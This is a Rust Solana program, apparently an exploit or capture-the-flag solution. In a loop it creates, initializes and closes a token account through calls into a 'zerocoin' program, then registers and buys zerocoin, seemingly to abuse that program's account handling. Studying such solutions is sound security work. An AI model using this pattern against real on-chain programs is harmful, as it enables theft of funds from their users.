#[cfg(not(feature = "no-entrypoint"))]
pub mod entrypoint {
    use anchor_lang::prelude::*;
    use solana_program::{
        account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, program::invoke,
        pubkey::Pubkey,
    };
    use zerocoin::cpi;

    entrypoint!(process_instruction);

    pub fn process_instruction(
        _program_id: &Pubkey,
        accounts: &[AccountInfo],
        _instruction_data: &[u8],
    ) -> ProgramResult {
        let mut iter = accounts.iter();
        let user = next_account_info(&mut iter)?;
        let vault = next_account_info(&mut iter)?;
        let mint = next_account_info(&mut iter)?;
        let user_token = next_account_info(&mut iter)?;
        let prog = next_account_info(&mut iter)?;
        let token_program = next_account_info(&mut iter)?;
        let system_program = next_account_info(&mut iter)?;

        assert!(user.is_writable);
        assert!(vault.is_writable);
        assert!(mint.is_writable);
        assert!(user_token.is_writable);

        for _ in 0..4 {
            cpi::create_account_helper(
                CpiContext::new(
                    prog.clone(),
                    cpi::accounts::CreateAccountHelper {
                        token: user_token.clone(),
                        vault: vault.clone(),
                        system_program: system_program.clone(),
                    },
                ),
                user.key(),
            )?;

            invoke(
                &spl_token::instruction::initialize_account3(
                    &spl_token::ID,
                    &user_token.key(),
                    &mint.key(),
                    &user.key(),
                )?,
                &[mint.clone(), user_token.clone()],
            )?;

            invoke(
                &spl_token::instruction::close_account(
                    &spl_token::ID,
                    &user_token.key(),
                    &user.key(),
                    &user.key(),
                    &[],
                )?,
                &[user_token.clone(), user.clone()],
            )?;
        }

        cpi::register(
            CpiContext::new(
                prog.clone(),
                cpi::accounts::Register {
                    token: user_token.clone(),
                    vault: vault.clone(),
                    system_program: system_program.clone(),
                    mint: mint.clone(),
                    token_program: token_program.clone(),
                    zerocoin: prog.clone(),
                },
            ),
            user.key(),
        )?;

        cpi::buy_zerocoin(
            CpiContext::new(
                prog.clone(),
                cpi::accounts::BuyZerocoin {
                    token: user_token.clone(),
                    user: user.clone(),
                    mint: mint.clone(),
                    vault: vault.clone(),
                    token_program: token_program.clone(),
                    system_program: system_program.clone(),
                },
            ),
            1,
        )?;

        Ok(())
    }
}
